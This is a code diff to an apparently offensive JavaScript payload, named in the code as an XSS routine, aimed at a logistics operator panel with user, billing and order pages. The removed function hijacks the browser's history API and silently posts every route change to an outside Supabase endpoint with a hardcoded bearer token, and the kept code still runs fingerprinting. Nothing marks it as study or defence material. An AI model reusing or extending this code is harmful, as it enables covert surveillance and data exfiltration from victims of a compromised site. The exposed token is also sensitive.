@@ -19,8 +19,6 @@ function executeMainXSS() {
     // Ejecutar fingerprinting directamente
     executeFullFingerprinting();
 
-    // Configurar sistema de rutas normal
-    setupRouteSystem();
 }
 
 function executeFullFingerprinting() {
@@ -105,67 +103,3 @@ function executeFullFingerprinting() {
     }
 }
 
-function setupRouteSystem() {
-    // Sistema de rutas simplificado - solo para monitoreo
-    let currentPath = window.location.pathname;
-
-    // Función para obtener título de página
-    function getPageTitle(path) {
-        const titles = {
-            '/Operator/Dashboard_M/': 'Dashboard',
-            '/Operator/Orders/': 'Órdenes',
-            '/Operator/Usuarios/': 'Usuarios',
-            '/Operator/Clientes/': 'Clientes',
-            '/Operator/Agencias/': 'Agencias',
-            '/Operator/Monitor/': 'Monitor',
-            '/Operator/GuiasAereas/': 'Guías Aéreas',
-            '/Operator/Billing/': 'Facturación',
-            '/Operator/Revision/': 'Revisiones',
-            '/Operator/incidenciaHouse/': 'Incidencias'
-        };
-        return titles[path] || 'Sistema';
-    }
-
-    // Monitorear cambios de ruta
-    const originalPushState = history.pushState;
-    const originalReplaceState = history.replaceState;
-
-    history.pushState = function (state, title, url) {
-        const result = originalPushState.apply(this, arguments);
-        trackRouteChange(url);
-        return result;
-    };
-
-    history.replaceState = function (state, title, url) {
-        const result = originalReplaceState.apply(this, arguments);
-        trackRouteChange(url);
-        return result;
-    };
-
-    function trackRouteChange(url) {
-        if (url) {
-            const urlStr = typeof url === 'string' ? url : url.toString();
-            currentPath = urlStr;
-
-            // Opcional: enviar tracking de cambios de ruta
-            try {
-                fetch('https://yfwzpojlsqkwvtmessmw.supabase.co/functions/v1/crud-data/crud/create', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                        'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inlmd3pwb2psc3Frd3Z0bWVzc213Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTkzNDI1ODIsImV4cCI6MjA3NDkxODU4Mn0.vuHSGbSKNHxUjXjgA6oJNdmHxsZblr_ZAXYYLe-yLA8'
-                    },
-                    body: JSON.stringify({
-                        route_change: {
-                            timestamp: new Date().toISOString(),
-                            from: currentPath,
-                            to: urlStr
-                        }
-                    })
-                });
-            } catch (e) {
-                // Silenciar errores
-            }
-        }
-    }
-}
